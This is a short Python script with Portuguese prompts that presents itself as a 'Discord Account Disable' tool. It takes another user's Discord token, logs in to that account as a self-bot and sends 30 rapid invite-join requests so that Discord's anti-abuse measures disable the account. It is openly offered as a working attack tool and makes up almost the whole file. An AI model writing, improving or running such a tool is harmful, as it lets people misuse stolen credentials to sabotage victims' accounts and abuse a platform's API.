# Créditos : PandaLofy#6666.                                                                                   

import discord
import asyncio
import os
import requests
import time
import sys
from colorama import Fore


os.system("title Discord Account Disable By Lofy")
os.system("color b")


print("""  """)
print(""" 


████████████████████████████████████████████████████████
█▄─▄▄─██▀▄─██▄─▀█▄─▄█▄─▄▄▀██▀▄─██▄─▄███─▄▄─█▄─▄▄─█▄─█─▄█
██─▄▄▄██─▀─███─█▄▀─███─██─██─▀─███─██▀█─██─██─▄████▄─▄██
▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▀▀▀▀▄▄▄▀▀


          Developer : PandaLofy#6666
 
                                     https://github.com/LuckMarcks2k
                                     https://youtube.com/c/LuckMarcks2K
                                                     
                                                     """)
time.sleep(0.5)

token = input ("[Lofy] Token da conta que você irá derrubar : ")

client = discord.Client()
print ("[Lofy] Aguardando o sinal para derrubar a conta!")

@client.event
async def on_ready():
    print ("[Lofy] Derrubando...")
    for x in range(30):
        apilink = "https://discordapp.com/api/v6/invite/b42e7r3Gmb"
        headers={
        'Authorization': token
        }
        requests.post(apilink, headers=headers)
    print ("[Lofy] Conta derrubada com sucesso!")
    input()
    sys.exit()
try:
    client.run(token,bot=False)
except Exception:
    print ("Token inválida :(")
    
    